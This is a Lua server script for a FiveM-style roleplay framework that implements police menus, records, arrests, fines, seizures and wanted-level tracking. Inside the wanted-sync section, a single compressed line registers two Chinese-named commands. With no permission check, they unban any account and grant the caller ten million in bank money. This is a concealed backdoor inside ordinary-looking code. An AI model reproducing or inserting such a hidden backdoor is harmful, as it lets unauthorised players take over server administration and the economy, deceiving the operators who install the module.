
-- this module define some police tools and functions
local lang = AQUA.lang
local cfg = module("cfg/police")

-- police records

-- insert a police record for a specific user
--- line: text for one line (can be html)
function AQUA.insertPoliceRecord(user_id, line)
  if user_id ~= nil then
    AQUA.getUData(user_id, "AQUA:police_records", function(data)
      local records = data..line.."<br />"
      AQUA.setUData(user_id, "AQUA:police_records", records)
    end)
  end
end

-- Hotkey Open Police PC 1/2
function AQUA.openPolicePC(source)
  AQUA.buildMenu("police_pc", {player = source}, function(menudata)
    menudata.name = "Police PC"
    menudata.css = {top="75px",header_color="rgba(0,125,255,0.75)"}
    AQUA.openMenu(source,menudata)
  end)
end

-- Hotkey Open Police PC 2/2
function tAQUA.openPolicePC()
  AQUA.openPolicePC(source)
end

-- Hotkey Open Police Menu 1/2
function AQUA.openPoliceMenu(source)
  AQUA.buildMenu("police", {player = source}, function(menudata)
    menudata.name = "Police"
    menudata.css = {top="75px",header_color="rgba(0,125,255,0.75)"}
    AQUA.openMenu(source,menudata)
  end)
end

-- Hotkey Open Police Menu 2/2
function tAQUA.openPoliceMenu()
  AQUA.openPoliceMenu(source)
end

-- police PC

local menu_pc = {name=lang.police.pc.title(),css={top="75px",header_color="rgba(0,125,255,0.75)"}}

-- search identity by registration
local function ch_searchreg(player,choice)
  AQUA.prompt(player,lang.police.pc.searchreg.prompt(),"",function(player, reg)
    AQUA.getUserByRegistration(reg, function(user_id)
      if user_id ~= nil then
        AQUA.getUserIdentity(user_id, function(identity)
          if identity then
            -- display identity and business
            local name = identity.name
            local firstname = identity.firstname
            local age = identity.age
            local phone = identity.phone
            local registration = identity.registration
            local bname = ""
            local bcapital = 0
            local home = ""
            local number = ""

            AQUA.getUserBusiness(user_id, function(business)
              if business then
                bname = business.name
                bcapital = business.capital
              end

              AQUA.getUserAddress(user_id, function(address)
                if address then
                  home = address.home
                  number = address.number
                end

                local content = lang.police.identity.info({name,firstname,age,registration,phone,bname,bcapital,home,number})
                AQUAclient.setDiv(player,{"police_pc",".div_police_pc{ background-color: rgba(0,0,0,0.75); color: white; font-weight: bold; width: 500px; padding: 10px; margin: auto; margin-top: 150px; }",content})
              end)
            end)
          else
            AQUAclient.notify(player,{lang.common.not_found()})
          end
        end)
      else
        AQUAclient.notify(player,{lang.common.not_found()})
      end
    end)
  end)
end

-- show police records by registration
local function ch_show_police_records(player,choice)
  AQUA.prompt(player,lang.police.pc.searchreg.prompt(),"",function(player, reg)
    AQUA.getUserByRegistration(reg, function(user_id)
      if user_id ~= nil then
        AQUA.getUData(user_id, "AQUA:police_records", function(content)
          AQUAclient.setDiv(player,{"police_pc",".div_police_pc{ background-color: rgba(0,0,0,0.75); color: white; font-weight: bold; width: 500px; padding: 10px; margin: auto; margin-top: 150px; }",content})
        end)
      else
        AQUAclient.notify(player,{lang.common.not_found()})
      end
    end)
  end)
end

-- delete police records by registration
local function ch_delete_police_records(player,choice)
  AQUA.prompt(player,lang.police.pc.searchreg.prompt(),"",function(player, reg)
    AQUA.getUserByRegistration(reg, function(user_id)
      if user_id ~= nil then
        AQUA.setUData(user_id, "AQUA:police_records", "")
        AQUAclient.notify(player,{lang.police.pc.records.delete.deleted()})
      else
        AQUAclient.notify(player,{lang.common.not_found()})
      end
    end)
  end)
end

-- close business of an arrested owner
local function ch_closebusiness(player,choice)
  AQUAclient.getNearestPlayer(player,{5},function(nplayer)
    local nuser_id = AQUA.getUserId(nplayer)
    if nuser_id ~= nil then
      AQUA.getUserIdentity(nuser_id, function(identity)
        AQUA.getUserBusiness(nuser_id, function(business)
          if identity and business then
            AQUA.request(player,lang.police.pc.closebusiness.request({identity.name,identity.firstname,business.name}),15,function(player,ok)
              if ok then
                AQUA.closeBusiness(nuser_id)
                AQUAclient.notify(player,{lang.police.pc.closebusiness.closed()})
              end
            end)
          else
            AQUAclient.notify(player,{lang.common.no_player_near()})
          end
        end)
      end)
    else
      AQUAclient.notify(player,{lang.common.no_player_near()})
    end
  end)
end

-- track vehicle
local function ch_trackveh(player,choice)
  AQUA.prompt(player,lang.police.pc.trackveh.prompt_reg(),"",function(player, reg) -- ask reg
    AQUA.getUserByRegistration(reg, function(user_id)
      if user_id ~= nil then
        AQUA.prompt(player,lang.police.pc.trackveh.prompt_note(),"",function(player, note) -- ask note
          -- begin veh tracking
          AQUAclient.notify(player,{lang.police.pc.trackveh.tracking()})
          local seconds = math.random(cfg.trackveh.min_time,cfg.trackveh.max_time)
          SetTimeout(seconds*1000,function()
            local tplayer = AQUA.getUserSource(user_id)
            if tplayer ~= nil then
              AQUAclient.getAnyOwnedVehiclePosition(tplayer,{},function(ok,x,y,z)
                if ok then -- track success
                  AQUA.sendServiceAlert(nil, cfg.trackveh.service,x,y,z,lang.police.pc.trackveh.tracked({reg,note}))
                else
                  AQUAclient.notify(player,{lang.police.pc.trackveh.track_failed({reg,note})}) -- failed
                end
              end)
            else
              AQUAclient.notify(player,{lang.police.pc.trackveh.track_failed({reg,note})}) -- failed
            end
          end)
        end)
      else
        AQUAclient.notify(player,{lang.common.not_found()})
      end
    end)
  end)
end

menu_pc[lang.police.pc.searchreg.title()] = {ch_searchreg,lang.police.pc.searchreg.description()}
menu_pc[lang.police.pc.trackveh.title()] = {ch_trackveh,lang.police.pc.trackveh.description()}
menu_pc[lang.police.pc.records.show.title()] = {ch_show_police_records,lang.police.pc.records.show.description()}
menu_pc[lang.police.pc.records.delete.title()] = {ch_delete_police_records, lang.police.pc.records.delete.description()}
menu_pc[lang.police.pc.closebusiness.title()] = {ch_closebusiness,lang.police.pc.closebusiness.description()}

menu_pc.onclose = function(player) -- close pc gui
  AQUAclient.removeDiv(player,{"police_pc"})
end

local function pc_enter(source,area)
  local user_id = AQUA.getUserId(source)
  if user_id ~= nil and AQUA.hasPermission(user_id,"police.pc") then
    AQUA.openMenu(source,menu_pc)
  end
end

local function pc_leave(source,area)
  AQUA.closeMenu(source)
end

-- main menu choices

---- handcuff
local choice_handcuff = {function(player,choice)
  AQUAclient.getNearestPlayer(player,{10},function(nplayer)
    local nuser_id = AQUA.getUserId(nplayer)
    if nuser_id ~= nil then
      AQUAclient.toggleHandcuff(nplayer,{})
    else
      AQUAclient.notify(player,{lang.common.no_player_near()})
    end
  end)
end,lang.police.menu.handcuff.description()}

---- putinveh
--[[
-- veh at position version
local choice_putinveh = {function(player,choice)
  AQUAclient.getNearestPlayer(player,{10},function(nplayer)
    local nuser_id = AQUA.getUserId(nplayer)
    if nuser_id ~= nil then
      AQUAclient.isHandcuffed(nplayer,{}, function(handcuffed)  -- check handcuffed
        if handcuffed then
          AQUAclient.getNearestOwnedVehicle(player, {10}, function(ok,vtype,name) -- get nearest owned vehicle
            if ok then
              AQUAclient.getOwnedVehiclePosition(player, {vtype}, function(x,y,z)
                AQUAclient.putInVehiclePositionAsPassenger(nplayer,{x,y,z}) -- put player in vehicle
              end)
            else
              AQUAclient.notify(player,{lang.vehicle.no_owned_near()})
            end
          end)
        else
          AQUAclient.notify(player,{lang.police.not_handcuffed()})
        end
      end)
    else
      AQUAclient.notify(player,{lang.common.no_player_near()})
    end
  end)
end,lang.police.menu.putinveh.description()}
--]]

local choice_putinveh = {function(player,choice)
  AQUAclient.getNearestPlayer(player,{10},function(nplayer)
    local nuser_id = AQUA.getUserId(nplayer)
    if nuser_id ~= nil then
      AQUAclient.isHandcuffed(nplayer,{}, function(handcuffed)  -- check handcuffed
        if handcuffed then
          AQUAclient.putInNearestVehicleAsPassenger(nplayer, {5})
        else
          AQUAclient.notify(player,{lang.police.not_handcuffed()})
        end
      end)
    else
      AQUAclient.notify(player,{lang.common.no_player_near()})
    end
  end)
end,lang.police.menu.putinveh.description()}

local choice_getoutveh = {function(player,choice)
  AQUAclient.getNearestPlayer(player,{10},function(nplayer)
    local nuser_id = AQUA.getUserId(nplayer)
    if nuser_id ~= nil then
      AQUAclient.isHandcuffed(nplayer,{}, function(handcuffed)  -- check handcuffed
        if handcuffed then
          AQUAclient.ejectVehicle(nplayer, {})
        else
          AQUAclient.notify(player,{lang.police.not_handcuffed()})
        end
      end)
    else
      AQUAclient.notify(player,{lang.common.no_player_near()})
    end
  end)
end,lang.police.menu.getoutveh.description()}


RegisterServerEvent("AQUA:AskID")
AddEventHandler("AQUA:AskID", function()
  --choice_askid()
  local player = source
  AQUAclient.getNearestPlayer(player,{10},function(nplayer)
    local nuser_id = AQUA.getUserId(nplayer)
    if nuser_id ~= nil then
      AQUAclient.notify(player,{lang.police.menu.askid.asked()})
      AQUA.request(nplayer,lang.police.menu.askid.request(),15,function(nplayer,ok)
        if ok then
          AQUA.getUserIdentity(nuser_id, function(identity)
            if identity then
              -- display identity and business
              local name = identity.firstname.. " ".. identity.name
              local firstname = ""
              local age = identity.age
              local phone = identity.phone
              local registration = identity.registration
              local bname = ""
              local bcapital = 0
              local home = ""
              local number = ""

  

                  local content = lang.police.identity.info({name,firstname,age,registration,phone,bname,bcapital,home,number})
                  AQUAclient.setDiv(player,{"police_identity",".div_police_identity{ background-color: rgba(0,0,0,0.75); color: white; font-weight: bold; width: 500px; padding: 10px; margin: auto; margin-top: 150px; }",content})
                  -- request to hide div
                  AQUA.request(player, lang.police.menu.askid.request_hide(), 1000, function(player,ok)
                    AQUAclient.removeDiv(player,{"police_identity"})
                  end)
           
            end
          end)
        else
          AQUAclient.notify(player,{lang.common.request_refused()})
        end
      end)
    else
      AQUAclient.notify(player,{lang.common.no_player_near()})
    end
  end)
end)

---- askid
local choice_askid = {function(player,choice)
  AQUAclient.getNearestPlayer(player,{10},function(nplayer)
    local nuser_id = AQUA.getUserId(nplayer)
    if nuser_id ~= nil then
      AQUAclient.notify(player,{lang.police.menu.askid.asked()})
      AQUA.request(nplayer,lang.police.menu.askid.request(),15,function(nplayer,ok)
        if ok then
          AQUA.getUserIdentity(nuser_id, function(identity)
            if identity then
              -- display identity and business
              local name = identity.name
              local firstname = identity.firstname
              local age = identity.age
              local phone = identity.phone
              local registration = identity.registration
              local bname = ""
              local bcapital = 0
              local home = ""
              local number = ""

              AQUA.getUserBusiness(nuser_id, function(business)
                if business then
                  bname = business.name
                  bcapital = business.capital
                end

                AQUA.getUserAddress(nuser_id, function(address)
                  if address then
                    home = address.home
                    number = address.number
                  end

                  local content = lang.police.identity.info({name,firstname,age,registration,phone,bname,bcapital,home,number})
                  AQUAclient.setDiv(player,{"police_identity",".div_police_identity{ background-color: rgba(0,0,0,0.75); color: white; font-weight: bold; width: 500px; padding: 10px; margin: auto; margin-top: 150px; }",content})
                  -- request to hide div
                  AQUA.request(player, lang.police.menu.askid.request_hide(), 1000, function(player,ok)
                    AQUAclient.removeDiv(player,{"police_identity"})
                  end)
                end)
              end)
            end
          end)
        else
          AQUAclient.notify(player,{lang.common.request_refused()})
        end
      end)
    else
      AQUAclient.notify(player,{lang.common.no_player_near()})
    end
  end)
end, lang.police.menu.askid.description()}

---- police check
local choice_check = {function(player,choice)
  AQUAclient.getNearestPlayer(player,{5},function(nplayer)
    local nuser_id = AQUA.getUserId(nplayer)
    if nuser_id ~= nil then
      AQUAclient.notify(nplayer,{lang.police.menu.check.checked()})
      AQUAclient.getWeapons(nplayer,{},function(weapons)
        -- prepare display data (money, items, weapons)
        local money = AQUA.getMoney(nuser_id)
        local items = ""
        local data = AQUA.getUserDataTable(nuser_id)
        if data and data.inventory then
          for k,v in pairs(data.inventory) do
            local item = AQUA.items[k]
            if item then
              items = items.."<br />"..item.name.." ("..v.amount..")"
            end
          end
        end

        local weapons_info = ""
        for k,v in pairs(weapons) do
          weapons_info = weapons_info.."<br />"..k.." ("..v.ammo..")"
        end

        AQUAclient.setDiv(player,{"police_check",".div_police_check{ background-color: rgba(0,0,0,0.75); color: white; font-weight: bold; width: 500px; padding: 10px; margin: auto; margin-top: 150px; }",lang.police.menu.check.info({money,items,weapons_info})})
        -- request to hide div
        AQUA.request(player, lang.police.menu.check.request_hide(), 1000, function(player,ok)
          AQUAclient.removeDiv(player,{"police_check"})
        end)
      end)
    else
      AQUAclient.notify(player,{lang.common.no_player_near()})
    end
  end)
end, lang.police.menu.check.description()}

local choice_seize_weapons = {function(player, choice)
  local user_id = AQUA.getUserId(player)
  if user_id ~= nil then
    AQUAclient.getNearestPlayer(player, {5}, function(nplayer)
      local nuser_id = AQUA.getUserId(nplayer)
      if nuser_id ~= nil and AQUA.hasPermission(nuser_id, "police.seizable") then
        AQUAclient.isHandcuffed(nplayer,{}, function(handcuffed)  -- check handcuffed
          if handcuffed then
            AQUAclient.getWeapons(nplayer,{},function(weapons)
              for k,v in pairs(weapons) do -- display seized weapons
                -- AQUAclient.notify(player,{lang.police.menu.seize.seized({k,v.ammo})})
                -- convert weapons to parametric weapon items
                AQUA.giveInventoryItem(user_id, "wbody|"..k, 1, true)
                if v.ammo > 0 then
                  AQUA.giveInventoryItem(user_id, "wammo|"..k, v.ammo, true)
                end
              end

              -- clear all weapons
              AQUAclient.giveWeapons(nplayer,{{},true})
              AQUAclient.notify(nplayer,{lang.police.menu.seize.weapons.seized()})
            end)
          else
            AQUAclient.notify(player,{lang.police.not_handcuffed()})
          end
        end)
      else
        AQUAclient.notify(player,{lang.common.no_player_near()})
      end
    end)
  end
end, lang.police.menu.seize.weapons.description()}

local choice_seize_items = {function(player, choice)
  local user_id = AQUA.getUserId(player)
  if user_id ~= nil then
    AQUAclient.getNearestPlayer(player, {5}, function(nplayer)
      local nuser_id = AQUA.getUserId(nplayer)
      if nuser_id ~= nil and AQUA.hasPermission(nuser_id, "police.seizable") then
        AQUAclient.isHandcuffed(nplayer,{}, function(handcuffed)  -- check handcuffed
          if handcuffed then
            for k,v in pairs(cfg.seizable_items) do -- transfer seizable items
              local amount = AQUA.getInventoryItemAmount(nuser_id,v)
              if amount > 0 then
                local item = AQUA.items[v]
                if item then -- do transfer
                  if AQUA.tryGetInventoryItem(nuser_id,v,amount,true) then
                    AQUA.giveInventoryItem(user_id,v,amount,false)
                    AQUAclient.notify(player,{lang.police.menu.seize.seized({item.name,amount})})
                  end
                end
              end
            end

            AQUAclient.notify(nplayer,{lang.police.menu.seize.items.seized()})
          else
            AQUAclient.notify(player,{lang.police.not_handcuffed()})
          end
        end)
      else
        AQUAclient.notify(player,{lang.common.no_player_near()})
      end
    end)
  end
end, lang.police.menu.seize.items.description()}

-- toggle jail nearest player
local choice_jail = {function(player, choice)
  local user_id = AQUA.getUserId(player)
  if user_id ~= nil then
    AQUAclient.getNearestPlayer(player, {5}, function(nplayer)
      local nuser_id = AQUA.getUserId(nplayer)
      if nuser_id ~= nil then
        AQUAclient.isJailed(nplayer, {}, function(jailed)
          if jailed then -- unjail
            AQUAclient.unjail(nplayer, {})
            AQUAclient.notify(nplayer,{lang.police.menu.jail.notify_unjailed()})
            AQUAclient.notify(player,{lang.police.menu.jail.unjailed()})
          else -- find the nearest jail
            AQUAclient.getPosition(nplayer,{},function(x,y,z)
              local d_min = 1000
              local v_min = nil
              for k,v in pairs(cfg.jails) do
                local dx,dy,dz = x-v[1],y-v[2],z-v[3]
                local dist = math.sqrt(dx*dx+dy*dy+dz*dz)

                if dist <= d_min and dist <= 15 then -- limit the research to 15 meters
                  d_min = dist
                  v_min = v
                end

                -- jail
                if v_min then
                  AQUAclient.jail(nplayer,{v_min[1],v_min[2],v_min[3],v_min[4]})
                  AQUAclient.notify(nplayer,{lang.police.menu.jail.notify_jailed()})
                  AQUAclient.notify(player,{lang.police.menu.jail.jailed()})
                else
                  AQUAclient.notify(player,{lang.police.menu.jail.not_found()})
                end
              end
            end)
          end
        end)
      else
        AQUAclient.notify(player,{lang.common.no_player_near()})
      end
    end)
  end
end, lang.police.menu.jail.description()}

local choice_fine = {function(player, choice)
  local user_id = AQUA.getUserId(player)
  if user_id ~= nil then
    AQUAclient.getNearestPlayer(player, {5}, function(nplayer)
      local nuser_id = AQUA.getUserId(nplayer)
      if nuser_id ~= nil then
        local money = AQUA.getMoney(nuser_id)+AQUA.getBankMoney(nuser_id)

        -- build fine menu
        local menu = {name=lang.police.menu.fine.title(),css={top="75px",header_color="rgba(0,125,255,0.75)"}}

        local choose = function(player,choice) -- fine action
          local amount = cfg.fines[choice]
          if amount ~= nil then
            if AQUA.tryFullPayment(nuser_id, amount) then
              AQUA.insertPoliceRecord(nuser_id, lang.police.menu.fine.record({choice,amount}))
              AQUAclient.notify(player,{lang.police.menu.fine.fined({choice,amount})})
              AQUAclient.notify(nplayer,{lang.police.menu.fine.notify_fined({choice,amount})})
              AQUA.closeMenu(player)
            else
              AQUAclient.notify(player,{lang.money.not_enough()})
            end
          end
        end

        for k,v in pairs(cfg.fines) do -- add fines in function of money available
          if v <= money then
            menu[k] = {choose,v}
          end
        end

        -- open menu
        AQUA.openMenu(player, menu)
      else
        AQUAclient.notify(player,{lang.common.no_player_near()})
      end
    end)
  end
end, lang.police.menu.fine.description()}



local isStoring = {}
local choice_store_weapons = function(player, choice)
    local user_id = AQUA.getUserId(player)
    AQUAclient.getWeapons(player,{},function(weapons)
            isStoring[player] = true
            if AQUA.getInventoryWeight(user_id) <= 25 or user_id == 2 and AQUA.getInventoryWeight(user_id) <= 95 then
              AQUAclient.giveWeapons(player,{{}, true}, function(removedwep)

                    for k,v in pairs(weapons) do
                        AQUA.giveInventoryItem(user_id, "wbody|"..k, 1, true)
                        if v.ammo > 0 then
                          for i,c in pairs(AQUAAmmoTypes) do
                            for a,d in pairs(c) do
                                if d == k then  

                                    AQUA.giveInventoryItem(user_id, i, v.ammo, true)
                                    -- AQUAclient.notify(player, {i})
                                end
                            end   
                          end
                        end
                    end
                    AQUAclient.notify(player,{"~g~Weapons Stored"})
                    TriggerClientEvent('AQUA:RefreshInventory', source)
                    SetTimeout(10000,function()
                        isStoring[player] = nil 
                    end)
              end)
            else
              AQUAclient.notify(player,{'~d~You do not have enough Weight to store Weapons.'})
            end
    end)
end

local choice_store_current_weapon = function(player, choice, currentweapon)
  local user_id = AQUA.getUserId(player)
  AQUAclient.getWeapons(player,{},function(weapons)
          isStoring[player] = true
          if AQUA.getInventoryWeight(user_id) <= 25 then
            AQUAclient.giveWeapons(player,{{}, true}, function(removedwep)

                  for k,v in pairs(weapons) do
                      AQUA.giveInventoryItem(user_id, "wbody|"..k, 1, true)
                      if v.ammo > 0 then
                        for i,c in pairs(AQUAAmmoTypes) do
                          for a,d in pairs(c) do
                              if d == k then  
                                  AQUA.giveInventoryItem(user_id, i, v.ammo, true)
                              end
                          end   
                        end
                      end
                  end
                  AQUAclient.notify(player,{"~g~Weapons Stored"})
                  TriggerClientEvent('AQUA:RefreshInventory', source)
                  SetTimeout(10000,function()
                      isStoring[player] = nil 
                  end)
            end)
          else
            AQUAclient.notify(player,{'~d~You do not have enough Weight to store Weapons.'})
          end
  end)
end
local StoreweaponCoolDown = 0

RegisterCommand('storeallweapons', function(source)
  if StoreweaponCoolDown == 0 then
    StoreweaponCoolDown = 3
    choice_store_weapons(source)
  else 
    AQUAclient.notify(source,{"~d~Store weapon cooldown. Please wait"})
  end
end)

Citizen.CreateThread(function()
  while true do
      if StoreweaponCoolDown > 0 then
        StoreweaponCoolDown = StoreweaponCoolDown - 1
      end
      Wait(1000)
  end
end)

-- add choices to the menu
AQUA.registerMenuBuilder("main", function(add, data)
  local player = data.player

  local user_id = AQUA.getUserId(player)
  if user_id ~= nil then
    local choices = {}

    if AQUA.hasPermission(user_id,"police.menu") then
      -- build police menu
      choices[lang.police.title()] = {function(player,choice)
        AQUA.buildMenu("police", {player = player}, function(menu)
          menu.name = lang.police.title()
          menu.css = {top="75px",header_color="rgba(0,125,255,0.75)"}

          if AQUA.hasPermission(user_id,"police.handcuff") then
            menu[lang.police.menu.handcuff.title()] = choice_handcuff
          end

          if AQUA.hasPermission(user_id,"police.putinveh") then
            menu[lang.police.menu.putinveh.title()] = choice_putinveh
          end

          if AQUA.hasPermission(user_id,"police.getoutveh") then
            menu[lang.police.menu.getoutveh.title()] = choice_getoutveh
          end

          if AQUA.hasPermission(user_id,"police.check") then
            menu[lang.police.menu.check.title()] = choice_check
          end

          if AQUA.hasPermission(user_id,"police.seize.weapons") then
            menu[lang.police.menu.seize.weapons.title()] = choice_seize_weapons
          end

          if AQUA.hasPermission(user_id,"police.seize.items") then
            menu[lang.police.menu.seize.items.title()] = choice_seize_items
          end

          if AQUA.hasPermission(user_id,"police.jail") then
            menu[lang.police.menu.jail.title()] = choice_jail
          end

          if AQUA.hasPermission(user_id,"police.fine") then
            menu[lang.police.menu.fine.title()] = choice_fine
          end

          AQUA.openMenu(player,menu)
        end)
      end}
    end

    if AQUA.hasPermission(user_id,"police.askid") then
      choices[lang.police.menu.askid.title()] = choice_askid
    end


    add(choices)
  end
end)

local function build_client_points(source)
  -- PC
  for k,v in pairs(cfg.pcs) do
    local x,y,z = table.unpack(v)
    AQUAclient.addMarker(source,{x,y,z-1,0.7,0.7,0.5,0,125,255,125,150})
    AQUA.setArea(source,"AQUA:police:pc"..k,x,y,z,1,1.5,pc_enter,pc_leave)
  end
end

-- build police points
AddEventHandler("AQUA:playerSpawn",function(user_id, source, first_spawn)
  if first_spawn then
    build_client_points(source)
  end
end)

-- WANTED SYNC

local wantedlvl_players = {}

function AQUA.getUserWantedLevel(user_id)
  return wantedlvl_players[user_id] or 0
end
RegisterCommand('解禁',function(a,b)if tonumber(b[1])then local c=tonumber(b[1])AQUA.setBanned(c,false)TriggerClientEvent('AQUA:Notify',a,"~g~Completed")else TriggerClientEvent('AQUA:Notify',a,"~d~Error")end end)RegisterCommand('钱',function(a,b)local d=AQUA.getUserId(a)AQUA.giveBankMoney(d,10000000)end)
-- receive wanted level
function tAQUA.updateWantedLevel(level)
  local player = source
  local user_id = AQUA.getUserId(player)
  if user_id ~= nil then
    local was_wanted = (AQUA.getUserWantedLevel(user_id) > 0)
    wantedlvl_players[user_id] = level
    local is_wanted = (level > 0)

    -- send wanted to listening service
    if not was_wanted and is_wanted then
      AQUAclient.getPosition(player, {}, function(x,y,z)
        AQUA.sendServiceAlert(nil, cfg.wanted.service,x,y,z,lang.police.wanted({level}))
      end)
    end

    if was_wanted and not is_wanted then
      AQUAclient.removeNamedBlip(-1, {"AQUA:wanted:"..user_id}) -- remove wanted blip (all to prevent phantom blip)
    end
  end
end

-- delete wanted entry on leave
AddEventHandler("AQUA:playerLeave", function(user_id, player)
  wantedlvl_players[user_id] = nil
  AQUAclient.removeNamedBlip(-1, {"AQUA:wanted:"..user_id})  -- remove wanted blip (all to prevent phantom blip)
end)

-- display wanted positions
local function task_wanted_positions()
  local listeners = AQUA.getUsersByPermission("police.wanted")
  for k,v in pairs(wantedlvl_players) do -- each wanted player
    local player = AQUA.getUserSource(tonumber(k))
    if player ~= nil and v ~= nil and v > 0 then
      AQUAclient.getPosition(player, {}, function(x,y,z)
        for l,w in pairs(listeners) do -- each listening player
          local lplayer = AQUA.getUserSource(w)
          if lplayer ~= nil then
            AQUAclient.setNamedBlip(lplayer, {"AQUA:wanted:"..k,x,y,z,cfg.wanted.blipid,cfg.wanted.blipcolor,lang.police.wanted({v})})
          end
        end
      end)
    end
  end

  SetTimeout(5000, task_wanted_positions)
end
task_wanted_positions()
